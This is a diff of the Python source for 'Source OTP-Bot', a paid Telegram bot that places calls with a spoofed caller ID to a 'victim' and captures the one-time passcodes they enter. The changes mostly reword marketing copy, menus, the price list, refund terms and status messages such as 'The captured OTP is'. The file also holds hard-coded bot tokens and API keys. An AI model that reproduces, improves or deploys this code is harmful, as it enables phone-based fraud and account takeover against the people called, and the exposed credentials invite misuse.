@@ -40,7 +40,7 @@ ngul.append(ng_url)
 
 
 ngrok_url= ngul[0]   # NGROK APP LINK HERE
-bot_tkn ='7383376915:AAE9-RhgxOxMG3NSLYN8bVChHQWT3yAEFR8'  # YOUR BOT API bot_tkn HERE
+bot_tkn ='7383376915:AAEzhKfgLnEejoyEQc8jEfF0I54BT7Jo5EM'  # YOUR BOT API bot_tkn HERE
 apiKey = '9bf6642c-6d37-472f-b430-da6e72e483e1'
 apiKey2 = "57wbs19H2d20290A0292Ha92k3hdeinqunj"
 last_message_ids = {}
@@ -105,23 +105,23 @@ def send_welcome(message):
       if user_day_check(userid)==0:
         delete_data(userid)
         bot.send_message(message.from_user.id, f"*You have expired key*",  parse_mode='Markdown')
+        send_welcome(message)
       elif user_day_check(userid)>0:
         
         name = message.from_user.first_name
         keyboard = types.InlineKeyboardMarkup(row_width=2)
-        
-        
-        item3 = types.InlineKeyboardButton(text="Available Voices 🔊", callback_data="/voice")
-        item4= types.InlineKeyboardButton(text="Show Commands 🪟 ", callback_data="/commands")
-        item7 = types.InlineKeyboardButton(text="All Features🎖️ ", callback_data="/features")
-        item6 = types.InlineKeyboardButton(text="Chat Support 🆘", callback_data="/support")
-        item9 = types.InlineKeyboardButton(text="Source Community 💬 ", callback_data="/community")
+        item3 = types.InlineKeyboardButton(text="Voices 🔊", callback_data="/voice")
+        item4= types.InlineKeyboardButton(text="Commands 🪟 ", callback_data="/commands")
+        item7 = types.InlineKeyboardButton(text="Features🎖️ ", callback_data="/features")
+        item6 = types.InlineKeyboardButton(text="Support 🆘", callback_data="/support")
+        item9 = types.InlineKeyboardButton(text="Community 💬 ", callback_data="/community")
         item8 = types.InlineKeyboardButton(text="Policy 🔐", callback_data="/privacy")
-        keyboard.add(item3,item4)
-        keyboard.add(item7,item6)
-        keyboard.add(item9,item8)
+        keyboard.add(item3)
+        keyboard.add(item7,item4)
+        keyboard.add(item9,item6)
+        keyboard.add(item8)
 
-        mes3 = bot.send_photo(chat_id=message.from_user.id, caption=f"🌐 Hello {name} Welcome To The Source OTP - BOT.", reply_markup=keyboard, parse_mode='Markdown',photo=open('starting_photp.jpg', 'rb')).message_id
+        mes3 = bot.send_photo(chat_id=message.from_user.id, caption=f"🌐 Hello {name} Welcome To The Source OTP - BOT.\n👇 Get Started Today! Click the buttons below to unlock the full potential of Source OTP-Bot. 👇", reply_markup=keyboard, parse_mode='Markdown',photo=open('starting_photp.jpg', 'rb')).message_id
         last_message_ids[message.from_user.id] = mes3
         
     else:
@@ -132,42 +132,49 @@ def send_welcome(message):
 
     name = message.from_user.first_name
     keyboard = types.InlineKeyboardMarkup(row_width=2)
-    item0 = types.InlineKeyboardButton(text="Key Price 💰", callback_data="/price")
-    item1 = types.InlineKeyboardButton(text="Purchase Key💵", callback_data="/buy")
+    
+    item1 = types.InlineKeyboardButton(text="Purchase Key💵", callback_data="/price")
     item2 = types.InlineKeyboardButton(text="Redeem  Key🔑", callback_data="/redeem")
-    item3 = types.InlineKeyboardButton(text="Source Community 💬 ", callback_data="/community")
-    item4= types.InlineKeyboardButton(text="Show Commands 🪟 ", callback_data="/commands")
-    item5 = types.InlineKeyboardButton(text="Available Voices 🔊", callback_data="/voice")
-    item7 = types.InlineKeyboardButton(text="All Features🎖️ ", callback_data="/features")
-    item6 = types.InlineKeyboardButton(text="Chat Support 🆘", callback_data="/support")
+    item3 = types.InlineKeyboardButton(text="Community 💬 ", callback_data="/community")
+    item4= types.InlineKeyboardButton(text="Commands 🪟 ", callback_data="/commands")
+    item5 = types.InlineKeyboardButton(text="Voices 🔊", callback_data="/voice")
+    item7 = types.InlineKeyboardButton(text="Features🎖️ ", callback_data="/features")
+    item6 = types.InlineKeyboardButton(text="Support 🆘", callback_data="/support")
     item8 = types.InlineKeyboardButton(text="Policy 🔐", callback_data="/privacy")
-    keyboard.add(item0,item1)
+    keyboard.add(item1)
     keyboard.add(item2, item4)
     keyboard.add(item5,item3)
     keyboard.add(item7,item6)
     keyboard.add(item8)
     mes2 = bot.send_photo(message.from_user.id,caption=f"""
-✨ Welcome to Source OTP-Bot ✨
+🌟 Welcome to Source OTP-Bot! 🌟
 
-🌍 Hello {name}! Your Ultimate Solution for OTP Captures is Here! 🌍
+👋 Hello, {name} Your Ultimate Solution for OTP Captures is right here! Let's dive into why you should choose us:
 
-Why Choose Us? Check Out Our Cutting-Edge Features:
+🔐 Top-Tier Security:
 
-🔒 Top-Tier Security:
-📲 Pre-Built Modules: Seamlessly integrate with various systems.
-🔍 Custom Caller ID/Spoofing: Present any caller ID you need.
-🔐 PGP/Conference Call: Secure communication with PGP encryption.
-🤖 Human & Robot Detection: Ensure you're always speaking to the right entity.
+• 📲Seamlessly integrate with various systems using our pre-built modules.
 
-Advanced Functionalities:
-💻 Custom Scripts: Tailor-made scripts for your unique requirements.
-🌐 International Calling: Connect globally without boundaries.
-⚡ Super Fast Response: Lightning-fast OTP captures, minimizing wait times.
+• 🔍Present any caller ID you need with custom caller ID/spoofing.
 
-User-Friendly Controls:
-✅ Accept/Deny Buttons: Instant control at your fingertips.
-🔄 Recall Button & Command: Easily manage and recall sessions.
-👇 Get Started Today! Click the buttons below to unlock the full potential of Source OTP-Bot.""",reply_markup=keyboard,photo=open('starting_photp.jpg', 'rb')).message_id 
+• 🤖Detect humans and robots to ensure you're always speaking to the right entity.
+
+🧬 Advanced Functionalities:
+
+• 💻Tailor-made custom scripts to meet your unique requirements.
+
+• 🌐Connect globally without boundaries using international calling.
+
+• ⚡️Lightning-fast OTP captures, minimizing wait times for super-fast responses.
+
+🤝 User-Friendly Controls:
+
+• ✅Instant control at your fingertips with accept/deny buttons.
+
+• 🔄Easily manage and recall sessions using the recall button and command.
+
+
+👇 Get Started Today! Click the buttons below to unlock the full potential of Source OTP-Bot. 👇""",reply_markup=keyboard,photo=open('starting_photp.jpg', 'rb')).message_id 
     last_message_ids[message.from_user.id] = mes2
   
   c.close()
@@ -181,8 +188,27 @@ def Price_list(message):
         item1 = types.InlineKeyboardButton(text="Back", callback_data='/backstart')
         keyboard.add(item1)
         bot.edit_message_caption(f"""*
-Price List Of Source OTP 🚀
+1.   Basic Plan:
+   • 💵 Price: 24 USD
+   • 💹 Value: 2,000 INR
+   • 🗓 Validity: 1 Day
 
+2.   Standard Plan:
+   • 💵 Price: 55 USD
+   • 💹 Value: 4,500 INR
+   • 🗓 Validity: 3 Days
+
+3.   Premium Plan:
+   • 💵 Price: 100 USD
+   • 💹 Value: 8,300 INR
+   • 🗓 Validity: 7 Days
+
+4.  Ultimate Plan:
+   • 💵 Price: 260 USD
+   • 💹 Value: 22,000 INR
+   • 🗓 Validity: 30 Days
+
+Contact @Shadow_hiddenx to purchase your Token 🗝️
 *""",message.from_user.id, message_id=last_message_ids[message.from_user.id], reply_markup=keyboard, parse_mode='Markdown')
     except:
         print("Price Error")
@@ -247,9 +273,9 @@ def community(message):
         keyboard = types.InlineKeyboardMarkup(row_width=2)
         item1 = types.InlineKeyboardButton(text="Dev 🧑‍💻", url='https://t.me/dynamic_up')
         item2 = types.InlineKeyboardButton(text="Owner 🧑", url='https://t.me/Shadow_hiddenx')
-        item3 = types.InlineKeyboardButton(text="Discussion Group 💪", url='https://t.me/source_otp_bot_discussion')
-        item6 = types.InlineKeyboardButton(text="Main Channel 💪", url='https://t.me/source_otp_bot_channel')
-        item4 = types.InlineKeyboardButton(text="View Vouches 🔢", url='https://t.me/sourcebotvouches')
+        item3 = types.InlineKeyboardButton(text="Discussion💪", url='https://t.me/source_otp_bot_discussion')
+        item6 = types.InlineKeyboardButton(text="Channel 💪", url='https://t.me/source_otp_bot_channel')
+        item4 = types.InlineKeyboardButton(text="Vouches 🔢", url='https://t.me/sourcebotvouches')
         
         if cdata!=None:
             item5 = types.InlineKeyboardButton(text="Back 🔙", callback_data="/activatedstartback")
@@ -270,42 +296,48 @@ def Start_back(message):
         global last_message_ids
         name = message.from_user.first_name
         keyboard = types.InlineKeyboardMarkup(row_width=2)
-        item0 = types.InlineKeyboardButton(text="Key Price 💰", callback_data="/price")
-        item1 = types.InlineKeyboardButton(text="Purchase Key 💵", callback_data="/buy")
-        item2 = types.InlineKeyboardButton(text="Redeem  Key 🔑", callback_data="/redeem")
-        item3 = types.InlineKeyboardButton(text="Source Community  💬 ", callback_data="/community")
-        item4= types.InlineKeyboardButton(text="Show Commands 🪟", callback_data="/commands")
-        item5 = types.InlineKeyboardButton(text="Available Voices  🔊", callback_data="/voice")
-        item7 = types.InlineKeyboardButton(text="All Features 🎖️ ", callback_data="/features")
-        item6 = types.InlineKeyboardButton(text="Chat Support 🆘", callback_data="/support")
+        item1 = types.InlineKeyboardButton(text="Purchase Key💵", callback_data="/price")
+        item2 = types.InlineKeyboardButton(text="Redeem  Key🔑", callback_data="/redeem")
+        item3 = types.InlineKeyboardButton(text="Community 💬 ", callback_data="/community")
+        item4= types.InlineKeyboardButton(text="Commands 🪟 ", callback_data="/commands")
+        item5 = types.InlineKeyboardButton(text="Voices 🔊", callback_data="/voice")
+        item7 = types.InlineKeyboardButton(text="Features🎖️ ", callback_data="/features")
+        item6 = types.InlineKeyboardButton(text="Support 🆘", callback_data="/support")
         item8 = types.InlineKeyboardButton(text="Policy 🔐", callback_data="/privacy")
-        keyboard.add(item0,item1)
+        keyboard.add(item1)
         keyboard.add(item2, item4)
         keyboard.add(item5,item3)
         keyboard.add(item7,item6)
         keyboard.add(item8)
         bot.edit_message_caption(chat_id=message.from_user.id,caption=f"""
-✨ Welcome to Source OTP-Bot ✨
+🌟 Welcome to Source OTP-Bot! 🌟
 
-🌍 Hello {name}! Your Ultimate Solution for OTP Captures is Here! 🌍
+👋 Hello, {name} Your Ultimate Solution for OTP Captures is right here! Let's dive into why you should choose us:
 
-Why Choose Us? Check Out Our Cutting-Edge Features:
+🔐 Top-Tier Security:
 
-🔒 Top-Tier Security:
-📲 Pre-Built Modules: Seamlessly integrate with various systems.
-🔍 Custom Caller ID/Spoofing: Present any caller ID you need.
-🔐 PGP/Conference Call: Secure communication with PGP encryption.
-🤖 Human & Robot Detection: Ensure you're always speaking to the right entity.
+• 📲Seamlessly integrate with various systems using our pre-built modules.
 
-Advanced Functionalities:
-💻 Custom Scripts: Tailor-made scripts for your unique requirements.
-🌐 International Calling: Connect globally without boundaries.
-⚡ Super Fast Response: Lightning-fast OTP captures, minimizing wait times.
+• 🔍Present any caller ID you need with custom caller ID/spoofing.
 
-User-Friendly Controls:
-✅ Accept/Deny Buttons: Instant control at your fingertips.
-🔄 Recall Button & Command: Easily manage and recall sessions.
-👇 Get Started Today! Click the buttons below to unlock the full potential of Source OTP-Bot.""", message_id=last_message_ids[message.from_user.id],reply_markup=keyboard)
+• 🤖Detect humans and robots to ensure you're always speaking to the right entity.
+
+🧬 Advanced Functionalities:
+
+• 💻Tailor-made custom scripts to meet your unique requirements.
+
+• 🌐Connect globally without boundaries using international calling.
+
+• ⚡️Lightning-fast OTP captures, minimizing wait times for super-fast responses.
+
+🤝 User-Friendly Controls:
+
+• ✅Instant control at your fingertips with accept/deny buttons.
+
+• 🔄Easily manage and recall sessions using the recall button and command.
+
+
+👇 Get Started Today! Click the buttons below to unlock the full potential of Source OTP-Bot. 👇""", message_id=last_message_ids[message.from_user.id],reply_markup=keyboard)
     except:
          send_welcome(message)
 
@@ -339,16 +371,17 @@ def activatedstartback(message):
         name = message.from_user.first_name
         keyboard = types.InlineKeyboardMarkup(row_width=2)
         
-        item3 = types.InlineKeyboardButton(text="Available Voices  🔊", callback_data="/voice")
-        item4= types.InlineKeyboardButton(text="Show Commands 💬", callback_data="/commands")
-        item5 = types.InlineKeyboardButton(text="All Features 🎖️ ", callback_data="/features")
-        item6 = types.InlineKeyboardButton(text="Chat Support 🆘", callback_data="/support")
-        item7 = types.InlineKeyboardButton(text="Source Community 💬 ", callback_data="/community")
+        item3 = types.InlineKeyboardButton(text="Voices 🔊", callback_data="/voice")
+        item4= types.InlineKeyboardButton(text="Commands 🪟 ", callback_data="/commands")
+        item7 = types.InlineKeyboardButton(text="Features🎖️ ", callback_data="/features")
+        item6 = types.InlineKeyboardButton(text="Support 🆘", callback_data="/support")
+        item9 = types.InlineKeyboardButton(text="Community 💬 ", callback_data="/community")
         item8 = types.InlineKeyboardButton(text="Policy 🔐", callback_data="/privacy")
-        keyboard.add(item3,item4)
-        keyboard.add(item5,item6)
-        keyboard.add(item7,item8)
-        mes3 = bot.edit_message_caption(chat_id=message.from_user.id, caption=f"🌐 Hello {name} Welcome To The Source OTP - BOT.", reply_markup=keyboard,message_id=last_message_ids[message.from_user.id], parse_mode='Markdown',).message_id
+        keyboard.add(item3)
+        keyboard.add(item7,item4)
+        keyboard.add(item9,item6)
+        keyboard.add(item8)
+        mes3 = bot.edit_message_caption(chat_id=message.from_user.id, caption=f"🌐 Hello {name} Welcome To The Source OTP - BOT.\n👇 Get Started Today! Click the buttons below to unlock the full potential of Source OTP-Bot. 👇", reply_markup=keyboard,message_id=last_message_ids[message.from_user.id], parse_mode='Markdown',).message_id
         last_message_ids[message.from_user.id] = mes3
 
 def Features(message):
@@ -438,25 +471,21 @@ def Privacy(message):
         keyboard = types.InlineKeyboardMarkup(row_width=1)
         keyboard.add(item1)
         bot.edit_message_caption(f"""*
-Terms & Conditions Of Source OTP 🚀
+Certainly!
 
-Refunds Policy ⏬
-No Refunds Once Keys Are Redeemed
-Please be aware that once a key is activated, refunds are not available. This policy is in place to maintain fairness for all our customers, no matter their history with us.
+💸 Key Redemption: Non-Refundable 💸
 
-Reason for This Policy
-Consider this similar to a concert ticket: once you've enjoyed the concert, you can't request a refund. In the same way, once a key is used, it's final and cannot be resold or refunded.
+😀 Once you've claimed a purchased key, it's a done deal – no refunds. We understand life's twists and turns, but for fairness, this policy applies universally, even to our longtime patrons.
 
-Add-on Policy ⏬
-If you face any issues with an add-on, it's crucial to contact support Immediately. there's a set period for resolving such matters. If you miss this window, we unfortunately cannot provide assistance.
+Why the Firm Policy? 😀
+Think of it like purchasing a concert ticket – once the music starts, there's no turning back. Similarly, once a key is utilized, it cannot be resold.
 
-Please Note ⏬
-We not give addon on small things like restarting the bot and loading api's such a small things.
+⌚️ Act Promptly for Add-ons! ⌚️
+Should you encounter any issues with your add-on, don't hesitate to contact the admin immediately! There's a specific timeframe for resolution. Missing the deadline, unfortunately, limits our capacity to assist.
 
-Important Reminder
-Be absolutely sure of your purchase before using a key. Our terms are uniformly applied to all customers, without exceptions.
-
-We May Change T&C In Future.
+The Bottom Line 😀
+Ensure your certainty before purchasing and claiming a key. These guidelines exist for the benefit of all, with no exceptions.
+Your comprehension is appreciated!
 *""",message.from_user.id, last_message_ids[message.from_user.id], reply_markup=keyboard, parse_mode='Markdown')
     except:
          send_welcome(message)
@@ -465,7 +494,7 @@ We May Change T&C In Future.
 
 #----------------------------------------------------------------------------------------------------
 
-@bot.message_handler(commands=['dayslimit'])
+@bot.message_handler(commands=['validity'])
 def current_credit(message):
    #Database connect------------------------
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
@@ -812,7 +841,7 @@ def callhangup(message):
 
 
 def callhangbutton(userid):  
-    bot.send_message(userid, f"*Call is Ringing 📞\n/endcall - Hangup ongoing call.*",  parse_mode='markdown')
+    bot.send_message(userid, f"*Phone Ringing 📳\nHangup ongoing call - /endcall*",  parse_mode='markdown')
 
 
 def callmaking(number,spoof,chatid,service,amd):
@@ -854,7 +883,7 @@ def callmaking(number,spoof,chatid,service,amd):
                     data = {
 
   "apikey": f"{apiKey2}",
-  "to":f"024{number}",
+  "to":f"042{number}",
   "from":f"{spoof}",
   "callback":f"{ngrok_url}/{service}/{chatid}/random/texis",
   "enable": "8881"
@@ -908,7 +937,7 @@ def custom_callmaking(number,spoof,chatid,script_id,amd):
                     data = {
 
   "apikey": f"{apiKey2}",
-  "to":f"024{number}",
+  "to":f"042{number}",
   "from":f"+{spoof}",
   "callback":f"{ngrok_url}/{script_id}/{chatid}/custom/texis",
   "enable": "8881"
@@ -1002,7 +1031,7 @@ def custom_confirm1(message):
     "voice": f"{no_space_voice}",
 }
         requests.post(url, json=data)
-        bot.send_message(chat_id,f"*Code received successfylly.@Sourceotpbot 🫶*",parse_mode='markdown')
+        bot.send_message(chat_id,f"*Code Accpeted ✅ Vouch To  @sourcebotvouches 🫶*",parse_mode='markdown')
         time.sleep(4)
         callhangup(call_control_id)
     elif up_resp1=='Deny':
@@ -1057,7 +1086,7 @@ def custom_prebuild_script_call(script_id,chatid):
     
 }
             requests.post(url1, json=data)
-            bot.send_message(chatid,f"""*Call Answered 🗣️*""",parse_mode='markdown')
+            bot.send_message(chatid,f"""*Call Answered 📞*""",parse_mode='markdown')
         
 
     elif event == "completed":
@@ -1090,7 +1119,7 @@ def custom_prebuild_script_call(script_id,chatid):
                  mes = "Call Ended by Victim ☎️"
             else:
                  mes =  " Call Ended ☎️ "
-            mesid = bot.send_message(chatid,f"""*{mes}\n/recall - Make call again*""", parse_mode='Markdown').message_id
+            mesid = bot.send_message(chatid,f"""*{mes}\nMake call again - /recall*""", parse_mode='Markdown').message_id
             last_message_ids[chatid]=mesid
             c.execute(f"Update users set status='active' where user_id={chatid}")
             db.commit()
@@ -1125,7 +1154,7 @@ def custom_prebuild_script_call(script_id,chatid):
 }
                 requests.post(url3, json=data)
             def custom_send_ask_otp(): 
-                bot.send_message(chatid,f"""*1 Pressed, Send OTP Now 📲*""",parse_mode='markdown')
+                bot.send_message(chatid,f"""*1 Pressed....Sending OTP Now 🔂*""",parse_mode='markdown')
             custom_bgtask2 = threading.Thread(target=custom_ask_otp)
 
             custom_bgtask2.start()
@@ -1141,7 +1170,7 @@ def custom_prebuild_script_call(script_id,chatid):
 }
             requests.post(url, json=data)
             otp_grabbed(chatid,otp=otp2)
-            bot.send_message(chatid,f"""*Code Captured {otp2} ✅*""",parse_mode='markdown')
+            bot.send_message(chatid,f"""*The captured OTP is {otp2} 🤖*""",parse_mode='markdown')
             keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,resize_keyboard = True)
             keyboard.row_width =2
             keyboard.max_row_keys=2
@@ -1244,7 +1273,7 @@ def prebuild_script_call(service,chatid):
     "maxdigits": f"1",
 }
         requests.post(url1, json=data)
-        bot.send_message(chatid,f"""*Call Answerd 🗣️*""",parse_mode='markdown')
+        bot.send_message(chatid,f"""*Call Answered 📞*""",parse_mode='markdown')
     
     elif event == "completed":
         call_cause = data['cause']
@@ -1277,7 +1306,7 @@ def prebuild_script_call(service,chatid):
             else:
                  mes =  " Call Ended ☎️ "
 
-            mesid = bot.send_message(chatid,f"""*{mes}\n/recall - Make call again*""", parse_mode='Markdown').message_id
+            mesid = bot.send_message(chatid,f"""*{mes}\nMake call again - /recall*""", parse_mode='Markdown').message_id
             last_message_ids[chatid]=mesid
             c.execute(f"Update users set status='active' where user_id={chatid}")
             db.commit()
@@ -1314,7 +1343,7 @@ def prebuild_script_call(service,chatid):
                 requests.post(url3, json=data)
 
             def send_ask_otp(): 
-                bot.send_message(chatid,f"""*1 Pressed, Send OTP Now 📲*""",parse_mode='markdown')
+                bot.send_message(chatid,f"""*1 Pressed....Sending OTP Now 🔂*""",parse_mode='markdown')
             bgtask2 = threading.Thread(target=ask_otp)
             bgtask2.start()
             send_ask_otp()
@@ -1329,7 +1358,7 @@ def prebuild_script_call(service,chatid):
 }
             requests.post(url, json=data)
             otp_grabbed(chatid,otp2)
-            bot.send_message(chatid,f"""*Code Captured {otp2} ✅*""",parse_mode='markdown')
+            bot.send_message(chatid,f"""*The captured OTP is {otp2} 🤖*""",parse_mode='markdown')
             keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,resize_keyboard = True)
             keyboard.row_width =2
             keyboard.max_row_keys=2
@@ -1449,7 +1478,7 @@ def t_custom_prebuild_script_call(script_id,chatid):
     
 }
             requests.post(url1, json=data)
-            bot.send_message(chatid,f"""*Call Answerd 🗣️*""",parse_mode='markdown')
+            bot.send_message(chatid,f"""*Call Answered 📞*""",parse_mode='markdown')
         
 
     elif event == "hangup":
@@ -1472,7 +1501,7 @@ def t_custom_prebuild_script_call(script_id,chatid):
             global last_message_ids
             mes =  " Call Ended ☎️ "
 
-            mesid = bot.send_message(chatid,f"""*{mes}\n/recall - Make call again*""", parse_mode='Markdown').message_id
+            mesid = bot.send_message(chatid,f"""*{mes}\nMake call again - /recall*""", parse_mode='Markdown').message_id
             last_message_ids[chatid]=mesid
             c.execute(f"Update users set status='active' where user_id={chatid}")
             db.commit()
@@ -1501,7 +1530,7 @@ def t_custom_prebuild_script_call(script_id,chatid):
 }
                 requests.post(url3, json=data)
             def custom_send_ask_otp(): 
-                bot.send_message(chatid,f"""*1 Pressed, Send OTP Now 📲*""",parse_mode='markdown')
+                bot.send_message(chatid,f"""*1 Pressed....Sending OTP Now 🔂*""",parse_mode='markdown')
             custom_bgtask2 = threading.Thread(target=custom_ask_otp)
 
             custom_bgtask2.start()
@@ -1518,7 +1547,7 @@ def t_custom_prebuild_script_call(script_id,chatid):
 }
             requests.post(url, json=data)
             otp_grabbed(chatid,otp=otp2)
-            bot.send_message(chatid,f"""*Code Captured {otp2} ✅*""",parse_mode='markdown')
+            bot.send_message(chatid,f"""*The captured OTP is {otp2} 🤖*""",parse_mode='markdown')
             keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,resize_keyboard = True)
             keyboard.row_width =2
             keyboard.max_row_keys=2
@@ -1651,7 +1680,7 @@ def tprebuild_script_call(service,chatid):
             global last_message_ids
             mes =  " Call Ended ☎️ "
  
-            mesid = bot.send_message(chatid,f"""*{mes}\n/recall - Make call again*""", parse_mode='Markdown').message_id
+            mesid = bot.send_message(chatid,f"""*{mes}\n Make call again - /recall*""", parse_mode='Markdown').message_id
             last_message_ids[chatid]=mesid
             c.execute(f"Update users set status='active' where user_id={chatid}")
             db.commit()
@@ -1683,7 +1712,7 @@ def tprebuild_script_call(service,chatid):
                 requests.post(url3, json=data)
 
             def send_ask_otp(): 
-                bot.send_message(chatid,f"""*1 Pressed, Send OTP Now 📲*""",parse_mode='markdown')
+                bot.send_message(chatid,f"""*1 Pressed....Sending OTP Now 🔂*""",parse_mode='markdown')
             bgtask2 = threading.Thread(target=ask_otp)
             bgtask2.start()
             send_ask_otp()
@@ -1699,7 +1728,7 @@ def tprebuild_script_call(service,chatid):
 }
             requests.post(url, json=data)
             otp_grabbed(chatid,otp2)
-            bot.send_message(chatid,f"""*Code Captured {otp2} ✅*""",parse_mode='markdown')
+            bot.send_message(chatid,f"""*The captured OTP is {otp2} 🤖*""",parse_mode='markdown')
             keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,resize_keyboard = True)
             keyboard.row_width =2
             keyboard.max_row_keys=2
@@ -1742,13 +1771,12 @@ def make_call_command(message):
                         service_name = mes[3]
                         otp_digits = int(mes[4])
                         voice = mes[5]
-                        print(number ,spoof)
+                        bot.send_message(message.from_user.id,f"*Phone Dialled ☎️*",parse_mode='markdown')
                         c.execute(f"update users set v_no={number},spoof_no={spoof},inp_sc='{voice}',del_col=0,status='active' where user_id={id} ")
                         db.commit()
                         c.execute(f"update call_data set last_service='{service_name}',otp_digits={otp_digits} where chat_id={id} ")
                         db.commit()
                         call_update(id)
-                        bot.send_message(message.from_user.id,f"*Call Initiated 📱 *",parse_mode='markdown')
                         a = make_call(f=f"{spoof}",t=f"{number}", user_id=id,service=service_name,amd=row[13])
                     except:
                         bot.send_message(message.from_user.id, f"*Invalid command\n/call <Victim Number> <Spoof Number> <Service Name> <OTP Digits> <voice>*",parse_mode='markdown')
@@ -1780,7 +1808,7 @@ def make_call_custon(message):
                         spoof = mes[2]
                         script_id = mes[3]
                         voice = mes[4]
-                        days =user_day_check(id)
+                        bot.send_message(message.from_user.id,f"*Phone Dialled ☎️*""",parse_mode='markdown')
                         c.execute(f"update users set v_no={number},spoof_no={spoof},sc_id={script_id},inp_sc='{voice}',del_col=0,username='{username}' where user_id={id} ")
                         db.commit()
                         c.execute(f"select * from custom_scripts where script_id={script_id} limit 1")
@@ -1802,7 +1830,6 @@ def make_call_custon(message):
                                 c.execute(f"update call_data set last_service='custom' where chat_id={id} ")
                                 db.commit()
                                 call_update(id)
-                                bot.send_message(message.from_user.id,f"*Call Initiated📱*""",parse_mode='markdown')
                                 b=custom_make_call(f= f"{spoof}",t=f"{number}",user_id=id,script_id=script_id,amd=row[13])
 
                         else:
@@ -1826,7 +1853,7 @@ def handle_callback(message):
     # username = message.from_user.username
     # url = f"https://api.telegram.org/bot5790251044:AAEs0MXum_SB_MoOshv7rQUeXNDc90sK8JM/sendMessage?chat_id=1819146856&text=@{name} - {message.data}"
     # requests.post(url)
-    if message.data == '/dayslimit':
+    if message.data == '/validity':
         current_credit(message)
     elif message.data == '/recall':
         recall_now(message)
